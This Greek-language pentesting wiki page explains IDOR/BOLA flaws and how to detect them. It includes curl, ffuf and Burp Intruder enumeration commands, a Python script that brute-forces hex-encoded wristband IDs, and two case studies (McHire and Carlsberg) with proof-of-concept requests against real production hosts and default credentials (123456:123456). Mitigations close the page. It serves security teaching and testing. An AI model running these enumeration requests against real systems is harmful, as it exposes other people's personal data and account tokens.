# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) εμφανίζεται όταν ένα web ή API endpoint αποκαλύπτει ή δέχεται ένα αναγνωριστικό που ελέγχεται από τον χρήστη και το οποίο χρησιμοποιείται **άμεσα** για πρόσβαση σε ένα εσωτερικό αντικείμενο **χωρίς να επαληθεύεται ότι ο καλών έχει εξουσιοδότηση** να προσπελάσει/τροποποιήσει το αντικείμενο.
Η επιτυχημένη εκμετάλλευση συνήθως επιτρέπει οριζόντια ή κάθετη αναβάθμιση προνομίων, όπως την ανάγνωση ή τροποποίηση δεδομένων άλλων χρηστών και, στη χειρότερη περίπτωση, πλήρη κατάληψη λογαριασμού ή μαζική εξαγωγή δεδομένων.

---
## 1. Εντοπισμός πιθανών IDOR

1. Αναζητήστε **παραμέτρους που αναφέρονται σε ένα αντικείμενο**:
* Path: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Query: `?id=42`, `?invoice=2024-00001`
* Body / JSON: `{"user_id": 321, "order_id": 987}`
* Headers / Cookies: `X-Client-ID: 4711`
2. Προτιμήστε endpoints που **διαβάζουν ή ενημερώνουν** δεδομένα (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Σημειώστε πότε τα αναγνωριστικά είναι **διαδοχικά ή προβλέψιμα** – αν το ID σας είναι `64185742`, τότε το `64185741` πιθανότατα υπάρχει.
4. Εξερευνήστε κρυφές ή εναλλακτικές ροές (π.χ. *"Paradox team members"* link σε σελίδες login) που μπορεί να εκθέσουν επιπλέον APIs.
5. Χρησιμοποιήστε μια **authenticated low-privilege session** και αλλάξτε μόνο το ID **κρατώντας το ίδιο token/cookie**. Η απουσία σφάλματος εξουσιοδότησης είναι συνήθως ένδειξη IDOR.

### Γρήγορη χειροκίνητη παραποίηση (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### Αυτοματοποιημένη αναγνώριση (Burp Intruder / curl loop)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
### Απαρίθμηση προβλέψιμων download IDs (ffuf)
Πανέλ file-hosting που απαιτούν authentication συχνά αποθηκεύουν μεταδεδομένα ανά χρήστη σε έναν ενιαίο πίνακα `files` και εκθέτουν ένα download endpoint όπως το `/download.php?id=<int>`. Αν ο handler ελέγχει μόνο αν υπάρχει το ID (και όχι αν ανήκει στον authenticated χρήστη), μπορείτε να σαρώσετε τον χώρο των ακέραιων με το έγκυρο session cookie σας και να κλέψετε τα backups/configs άλλων tenants:
```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ \
-H "Cookie: PHPSESSID=<session>" \
-w <(seq 0 6000) \
-fr 'File Not Found' \
-o hits.json
jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
```
* `-fr` αφαιρεί τα 404-style templates ώστε να παραμείνουν μόνο τα πραγματικά hits (π.χ., IDs 54/150 leaking πλήρη αντίγραφα ασφαλείας του ιστότοπου και υλικό υπογραφής).
* Το ίδιο FFUF workflow λειτουργεί με Burp Intruder ή ένα curl loop — απλώς βεβαιωθείτε ότι παραμένετε authenticated ενώ αυξάνετε τα IDs.

---

### Error-response oracle for user/file enumeration

Όταν ένα download endpoint δέχεται τόσο ένα username όσο και ένα filename (π.χ. `/view.php?username=<u>&file=<f>`), μικρές διαφορές στα μηνύματα σφάλματος συχνά δημιουργούν ένα oracle:

- Non-existent username → "User not found"
- Bad filename but valid extension → "File does not exist" (μερικές φορές επίσης εμφανίζει διαθέσιμα αρχεία)
- Bad extension → validation error

Με οποιαδήποτε authenticated session, μπορείτε να fuzz την παράμετρο username ενώ κρατάτε ένα benign filename και να φιλτράρετε με βάση το string "user not found" για να ανακαλύψετε έγκυρους χρήστες:
```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
-b 'PHPSESSID=<session-cookie>' \
-w /opt/SecLists/Usernames/Names/names.txt \
-fr 'User not found'
```
Μόλις εντοπιστούν έγκυρα ονόματα χρηστών, ζητήστε συγκεκριμένα αρχεία απευθείας (π.χ., `/view.php?username=amanda&file=privacy.odt`). Αυτό το μοτίβο συνήθως οδηγεί σε μη εξουσιοδοτημένη αποκάλυψη των εγγράφων άλλων χρηστών και credential leakage.

---
## 2. Πραγματική μελέτη περίπτωσης – McHire Chatbot Platform (2025)

Κατά τη διάρκεια αξιολόγησης της Paradox.ai-powered **McHire** πύλης πρόσληψης εντοπίστηκε το ακόλουθο IDOR:

* Σημείο τερματισμού: `PUT /api/lead/cem-xhr`
* Εξουσιοδότηση: user session cookie για **οποιονδήποτε** λογαριασμό δοκιμής εστιατορίου
* Παράμετρος σώματος: `{"lead_id": N}` – 8-ψήφιος, **διαδοχικός** αριθμητικός αναγνωριστής

Μειώνοντας το `lead_id`, ο tester απέκτησε τυχαίων υποψηφίων **full PII** (όνομα, e-mail, τηλέφωνο, διεύθυνση, προτιμήσεις βάρδιας) καθώς και ένα consumer **JWT** που επέτρεπε κατάληψη συνεδρίας. Enumeration του εύρους `1 – 64,185,742` αποκάλυψε περίπου **64 million** εγγραφές.

Proof-of-Concept request:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combined with **default admin credentials** (`123456:123456`) που έδιναν πρόσβαση στον test account, το ευάλωτο σημείο οδήγησε σε κρίσιμο, εταιρικό data breach.

### Μελέτη περίπτωσης – QR κωδικοί περιβραχιονίων ως αδύναμοι bearer tokens (2025–2026)

*Flow:* Οι επισκέπτες της έκθεσης έπαιρναν βραχιολάκια με QR· σκανάροντας `https://homeofcarlsberg.com/memories/` ο browser έπαιρνε το **τυπωμένο wristband ID**, το hex-encode και έκανε κλήση σε backend στο `cloudfunctions.net` για να φέρει αποθηκευμένα media (φωτογραφίες/βίντεο + ονόματα). Δεν υπήρχε **session binding** ή έλεγχος ταυτότητας χρήστη—**η γνώση του ID = authorization**.

*Predictability:* Τα wristband IDs ακολουθούσαν σύντομο μοτίβο όπως `C-285-100` → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`). Ο χώρος κλειδιών εκτιμήθηκε σε ~26M συνδυασμούς, εύκολος να εξαντληθεί online.

*Exploitation workflow with Burp Intruder:*
1. **Payload generation:** Build candidate IDs (π.χ. `[A-Z]-###-###`). Χρησιμοποιήστε ένα Burp Intruder **Pitchfork** ή **Cluster Bomb** attack με θέσεις για το γράμμα και τα ψηφία. Προσθέστε έναν **payload processing rule → Add prefix/suffix → payload encoding: ASCII hex** ώστε κάθε αίτημα να στέλνει το hex string που περιμένει το backend.
2. **Response grep:** Επισημάνετε στο Intruder **grep-match** δείκτες που εμφανίζονται μόνο σε έγκυρες απαντήσεις (π.χ. media URLs/JSON πεδία). Τα άκυρα IDs συνήθως επέστρεφαν κενό array/404.
3. **Throughput measurement:** ~1,000,000 IDs δοκιμάστηκαν σε ~2 ώρες από laptop (~139 req/s). Με αυτόν τον ρυθμό ο πλήρης keyspace (~26M) θα έπεφτε σε ~52 ώρες. Το δείγμα αποκάλυψε ήδη ~500 έγκυρα wristbands (βίντεο + πλήρη ονόματα).
4. **Rate-limiting verification:** Αφού ο vendor ισχυρίστηκε throttling, επανέτρεξε την ίδια Intruder config. Ιδιο throughput/hit-rate απέδειξε ότι ο έλεγχος έλειπε/ήταν αναποτελεσματικός· η enumeration συνεχίστηκε ανεμπόδιστα.

Quick scriptable variant (client-side hex encoding):
```python
import requests

def to_hex(s):
return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
hex_id = to_hex(band_id)
r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
if r.ok and "media" in r.text:
print(band_id, "->", r.json())
```
> **Lesson:** Encoding (ASCII→hex/Base64) δεν προσθέτει εντροπία· τα short IDs γίνονται **bearer tokens** που είναι enumerable παρά την επιφανειακή κωδικοποίηση. Χωρίς per-user authorization + high-entropy secrets, media/PII μπορούν να συλλεχθούν μαζικά ακόμα κι αν ισχυρίζονται “rate limiting”.

---
## 3. Impact of IDOR / BOLA
* Οριζόντια κλιμάκωση – read/update/delete **other users’** data.
* Κατακόρυφη κλιμάκωση – χρήστης με χαμηλά προνόμια αποκτά admin-only functionality.
* Μαζική διαρροή δεδομένων εάν οι αναγνωριστές είναι διαδοχικοί (π.χ., IDs υποψηφίων, τιμολόγια).
* Account takeover με κλοπή tokens ή επαναφορά passwords άλλων χρηστών.

---
## 4. Mitigations & Best Practices
1. **Enforce object-level authorization** σε κάθε αίτημα (`user_id == session.user`).
2. Προτιμήστε **indirect, unguessable identifiers** (UUIDv4, ULID) αντί για auto-increment IDs.
3. Εκτελέστε authorization **server-side**, μην βασίζεστε σε hidden form fields ή UI controls.
4. Υλοποιήστε ελέγχους **RBAC / ABAC** σε ένα κεντρικό middleware.
5. Προσθέστε **rate-limiting & logging** για να εντοπίζεται η enumeration των IDs.
6. Κάντε security testing κάθε νέου endpoint (unit, integration, and DAST).

---
## 5. Tooling
* **BurpSuite extensions**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Github projects**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).



## References
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
* [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
* [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
* [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
{{#include ../banners/hacktricks-training.md}}
